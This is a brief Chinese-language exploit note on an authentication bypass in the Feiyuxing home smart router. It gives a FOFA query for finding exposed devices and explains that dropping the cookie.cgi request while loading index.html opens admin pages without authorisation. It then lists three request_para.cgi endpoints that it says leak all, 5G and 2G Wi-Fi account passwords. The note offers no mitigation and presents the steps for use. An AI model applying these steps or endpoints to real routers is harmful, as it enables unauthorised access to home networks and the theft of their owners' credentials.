# 飞鱼星 家用智能路由 cookie.cgi 权限绕过

飞鱼星家用智能路由存在权限绕过，通过Drop特定的请求包访问未授权的管理员页面。

fofa:title="飞鱼星家用智能路由"


```
http://xxx.xxx.xxx.xxx/index.html
访问 index.html 时会请求 cookie.cgi
页面抓包 Drop掉 cookie.cgi
```


```
/request_para.cgi?parameter=wifi_info      #获取ALL WIFI账号密码
/request_para.cgi?parameter=wifi_get_5g_host #获取5GWIFI账号密码
/request_para.cgi?parameter=wifi_get_2g_host #获取2GWIFI账号密码
```

ref:

* https://mp.weixin.qq.com/s/ARCZIR2C40KSu8SjLMYHSw
* https://forum.ywhack.com/thread-115486-1-5.html